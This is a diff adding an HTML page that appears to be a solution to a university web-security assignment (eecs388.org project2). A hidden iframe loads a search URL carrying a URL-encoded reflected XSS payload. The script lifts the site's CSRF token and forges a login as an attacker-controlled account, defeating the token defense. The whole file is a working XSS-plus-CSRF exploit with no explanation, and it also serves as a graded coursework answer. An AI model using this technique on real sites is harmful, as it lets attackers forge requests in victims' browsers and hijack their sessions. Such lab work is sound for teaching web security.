@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
+	<script>
+		$(function()
+		{
+			$('#iframe').hide()
+		});
+	</script>
+</head>
+
+<body>
+	<iframe id="iframe" src="http://eecs388.org/project2/search?q=%3Ciframe+id%3D%22iframe%22+src%3D%22http%3A%2F%2Feecs388.org%2Fproject2%2F%3Fcsrfdefense%3D1%26xssdefense%3D0%22%3E%3C%2Fiframe%3E%3Cscript%3E%24%28function%28%29%7BsetTimeout%28function%28%29%7B%24.post%28%22http%3A%2F%2Feecs388.org%2Fproject2%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%22%2C%7Busername%3A%22attacker%22%2Cpassword%3A%22l33th4x%22%2Ccsrf_token%3A%24%28%27%23iframe%27%29.contents%28%29.find%28%27input%5Bname%3D%22csrf_token%22%5D%27%29.val%28%29%7D%2Cfunction%28e%29%7Bconsole.log%28%27successful%27%29%3B%7D%29%3B%7D%2C+1000%29%3B%7D%29%3B%3C%2Fscript%3E&csrfdefense=1&xssdefense=0"></iframe>
+</body>
+</html>
+
+
+
